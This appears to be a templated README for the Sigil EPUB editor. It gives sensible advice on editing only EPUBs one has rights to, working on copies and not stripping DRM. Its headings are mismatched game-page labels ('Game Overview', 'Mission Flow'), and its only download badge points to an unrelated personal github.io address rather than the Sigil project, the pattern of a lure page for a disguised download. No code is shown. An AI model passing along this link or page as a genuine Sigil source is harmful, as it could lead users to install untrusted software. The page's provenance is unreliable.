# Sigil - Edit an EPUB You Are Allowed to Change

[![GET Sigil](https://img.shields.io/badge/GET%20%E2%80%94%20Sigil-0f766e?style=for-the-badge&logoColor=white)](https://torremagdalena595.github.io/.github/sigil-xhtml)

## Game Overview

Sigil edits EPUB files you are allowed to change: a book you wrote, or a file a publisher gave you to correct. You change the text or the structure and save a new EPUB. It does not remove DRM, and it does not unlock a store file that refuses to open. If the book will not open because it is protected, stop. You need an unlocked file from the person who can provide one.

Work on a copy. The EPUB you save is a new name until you are sure the edit is right. Open that file in a normal reader and check the first chapter and the last. A contents list that points at the wrong place is still wrong even if the editor preview looked fine.

## Play Your Way

Fix a typo in a book you wrote. Open the copy, find the sentence, change it, and save a new EPUB. Read that sentence in a reader that is not Sigil. That is a complete job.

Build a short EPUB from text you wrote, a chapter at a time, only if you would rather assemble it than fix an existing file. Images in the book must be ones you may use. A chapter pasted from a book you do not have rights to is not your EPUB. Sigil will not add that right.

## Mission Flow

Copy the EPUB into a working folder. Open the copy in Sigil. If it asks for a key or refuses because of protection, close it. Do not search for a way to strip the protection.

Edit one thing you can check, such as a title or a sentence. Save As with a new name. Open the new file in a reader. Turn to the place you changed. Keep the untouched copy until that page is right. Then you can decide whether the new file replaces the old one in the folder you ship.

## Included Content

- An editor for an EPUB you can already open and may change
- A copy-first workflow and Save As
- A check in a separate reader after the save
- Text and structure you are allowed to edit
- A stop when the file is DRM-protected
- No tool path for stripping protection or for borrowing a book

## Perfect Audience

Sigil fits an author fixing their own file, and a producer correcting an EPUB they were given in the clear. One sentence, a new file, a reader check.

It does not fit a purchased book that will not open, a textbook you do not have rights to adapt, or a wish to strip a lock. If you cannot open it in a normal reader, Sigil is not the next step.

## Common Issues

The file will not open because it is protected. Stop. A reader that does not show your edit is showing the old file. Open the new name. A broken contents page means the structure, not the cover. Fix it in the copy and save again. If you saved over the only good EPUB, restore the copy you should have made before the edit. Do not download a "DRM-free" copy of someone else's book to replace it.

## Extended Notes

Keep the source EPUB until the new one has been read through the changed pages. Name the export so the version is obvious. Images and fonts in the package need to be ones you may ship. A preview inside Sigil is not the same as the reader your audience will use.
